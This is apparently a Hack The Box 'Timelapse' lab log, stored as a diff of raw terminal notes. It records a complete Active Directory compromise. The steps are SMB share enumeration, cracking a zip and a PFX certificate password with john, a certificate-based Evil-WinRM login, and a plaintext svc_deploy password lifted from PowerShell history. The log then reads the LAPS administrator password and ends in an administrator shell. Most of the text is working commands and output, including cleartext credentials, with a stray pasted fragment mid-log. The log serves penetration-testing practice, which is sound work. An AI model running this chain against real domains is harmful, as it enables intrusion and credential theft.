@@ -1,0 +1,227 @@
+PORT      STATE SERVICE           VERSION
+53/tcp    open  domain            Simple DNS Plus
+88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-12-07 22:11:31Z)
+135/tcp   open  msrpc             Microsoft Windows RPC
+139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
+389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ldapssl?
+3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  globalcatLDAPssl?
+5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_ssl-date: 2025-12-07T22:13:04+00:00; +7h30m44s from scanner time.
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+| tls-alpn: 
+|_  http/1.1
+| ssl-cert: Subject: commonName=dc01.timelapse.htb
+| Not valid before: 2021-10-25T14:05:29
+|_Not valid after:  2022-10-25T14:25:29
+9389/tcp  open  mc-nmf            .NET Message Framing
+49667/tcp open  msrpc             Microsoft Windows RPC
+49675/tcp open  msrpc             Microsoft Windows RPC
+49676/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
+49694/tcp open  msrpc             Microsoft Windows RPC
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+
+└─$ netexec smb 10.10.11.152 -u guest -p '' --shares
+SMB         10.10.11.152    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.152    445    DC01             [+] timelapse.htb\guest: 
+SMB         10.10.11.152    445    DC01             [*] Enumerated shares
+SMB         10.10.11.152    445    DC01             Share           Permissions     Remark
+SMB         10.10.11.152    445    DC01             -----           -----------     ------
+SMB         10.10.11.152    445    DC01             ADMIN$                          Remote Admin
+SMB         10.10.11.152    445    DC01             C$                              Default share
+SMB         10.10.11.152    445    DC01             IPC$            READ            Remote IPC
+SMB         10.10.11.152    445    DC01             NETLOGON                        Logon server share
+SMB         10.10.11.152    445    DC01             Shares          READ            
+SMB         10.10.11.152    445    DC01             SYSVOL                          Logon server share
+
+//add timelapse.htb to hosts
+
+smb: \Dev\> mget *
+Get file winrm_backup.zip? y
+getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)
+smb: \Dev\> cd ..
+smb: \> cd HelpDesk\
+smb: \HelpDesk\> mget *
+Get file LAPS.x64.msi? y
+getting file \HelpDesk\LAPS.x64.msi of size 1118208 as LAPS.x64.msi (95.0 KiloBytes/sec) (average 78.1 KiloBytes/sec)
+Get file LAPS_Datasheet.docx? y
+getting file \HelpDesk\LAPS_Datasheet.docx of size 104422 as LAPS_Datasheet.docx (42.1 KiloBytes/sec) (average 72.8 KiloBytes/sec)
+Get file LAPS_OperationsGuide.docx? y
+getting file \HelpDesk\LAPS_OperationsGuide.docx of size 641378 as LAPS_OperationsGuide.docx (58.3 KiloBytes/sec) (average 67.1 KiloBytes/sec)
+Get file LAPS_TechnicalSpecification.docx? y
+getting file \HelpDesk\LAPS_TechnicalSpecification.docx of size 72683 as LAPS_TechnicalSpecification.docx (40.8 KiloBytes/sec) (average 65.5 KiloBytes/sec)
+
+└─$ unzip winrm_backup.zip 
+Archive:  winrm_backup.zip
+[winrm_backup.zip] legacyy_dev_auth.pfx password:                                                                                                     
+┌──(ed㉿kali)-[~/tmp]
+└─$ zip2john winrm_backup.zip > hash    
+ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8
+
+└─$ john --wordlist=~/oscp/rockyou.txt hash    
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 6 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
+1g 0:00:00:00 DONE (2025-12-07 09:56) 2.380g/s 8279Kp/s 8279Kc/s 8279KC/s surkerior..supalove
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+└─$ strings legacyy_dev_auth.pfx 
+_	Er
+C(!,
+4bz'
+`o<l
+|Y4W
+I0{Q
+L(vqQ#
+{q[l"8
+`+$DOC
+hK*y
+;5UERr
+X!+3
+&JCy
+$-1f
+NAM'u
+"-r$$
+Legacyy0
+211025140552Z
+311025141552Z0
+Legacyy0
+r"*J0:
+cZK3
+".G,
+x0v0
+legacyy@timelapse.htb0
+}J5~f
+t{(lz
+5&8H
+
+
+
+└─$ pfx2john legacyy_dev_auth.pfx > hash1
+
+└─$ john --wordlist=~/oscp/rockyou.txt hash1   
+Using default input encoding: UTF-8
+Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
+Cost 1 (iteration count) is 2000 for all loaded hashes
+Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
+Will run 6 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+thuglegacy       (legacyy_dev_auth.pfx)     
+1g 0:00:00:22 DONE (2025-12-07 10:52) 0.04393g/s 141992p/s 141992c/s 141992C/s thugways..thsco04
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+//have the passwd of pfx, we can exrtact the pem and cert
+https://red.infiltr8.io/a-d/movement/kerberos/pass-the-certificate
+
+┌──(ed㉿kali)-[~/tmp]
+└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts nokeys -out private.crt
+pkcs12: Extra option: "nokeys"
+pkcs12: Use -help for summary.
+                                                                                                    
+┌──(ed㉿kali)-[~/tmp]
+└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out private.crt
+Enter Import Password:
+                                                                                                    
+┌──(ed㉿kali)-[~/tmp]
+└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts  -out private.key 
+Enter Import Password:
+Enter PEM pass phrase:
+Verifying - Enter PEM pass phrase:
+                                                                                                    
+┌──(ed㉿kali)-[~/tmp]
+└─$ openssl rsa -in private.key -out decypt.key                       
+Enter pass phrase for private.key:
+writing RSA key
+
+└─$ evil-winrm -i 10.10.11.152 -c private.crt -k decypt.key -S -r timelapse.htb 
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Warning: SSL enabled
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
+timelapse\legacyy
+ractice
+There are many tools that implement pass-the-hash: Impacket scripts (Python) (psexec, smbexec, secretsdump...), NetE
+
+//check the powershell history
+*Evil-WinRM* PS C:\windows> type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+whoami
+ipconfig /all
+netstat -ano |select-string LIST
+$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
+$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
+invoke-command -computername localhost -credential $c -port 5986 -usessl -
+SessionOption $so -scriptblock {whoami}
+get-aduser -filter * -properties *
+exit
+
+//lateral move 
+
+evil-winrm -i 10.10.11.152 -u svc_deploy -p "E3R\$Q62^12p7PLlC%KWaxuaV" -S
+
+*Evil-WinRM* PS C:\windows> net user svc_deploy
+User name                    svc_deploy
+Full Name                    svc_deploy
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            10/25/2021 11:12:37 AM
+Password expires             Never
+Password changeable          10/26/2021 11:12:37 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   10/25/2021 11:25:53 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *LAPS_Readers         *Domain Users
+The command completed successfully.
+
+//this user is in LAPS_READERS group  ,https://www.thehacker.recipes/ad/movement/dacl/readlapspassword
+
+
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'
+
+
+DistinguishedName           : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
+DNSHostName                 : dc01.timelapse.htb
+Enabled                     : True
+ms-mcs-admpwd               : (-C6!EX.4LNs(;XR8Kb#K!gk
+ms-mcs-admpwdexpirationtime : 134100508166750029
+Name                        : DC01
+ObjectClass                 : computer
+ObjectGUID                  : 6e10b102-6936-41aa-bb98-bed624c9b98f
+SamAccountName              : DC01$
+SID                         : S-1-5-21-671920749-559770252-3318990721-1000
+UserPrincipalName           :
+
+                                 
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+timelapse\administrator
